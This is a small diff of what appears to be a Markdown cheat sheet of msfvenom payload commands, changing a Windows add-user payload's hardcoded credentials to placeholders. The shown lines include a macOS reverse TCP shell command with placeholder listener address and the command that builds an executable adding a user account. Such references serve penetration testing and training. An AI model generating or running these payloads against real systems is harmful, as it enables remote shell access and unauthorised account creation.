@@ -97,5 +97,5 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port
 ```
 ## Create user
 ```
-msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe > adduser.exe
+msfvenom -p windows/adduser USER=<USER> PASS=<PASSWORD> -f exe > adduser.exe
 ```
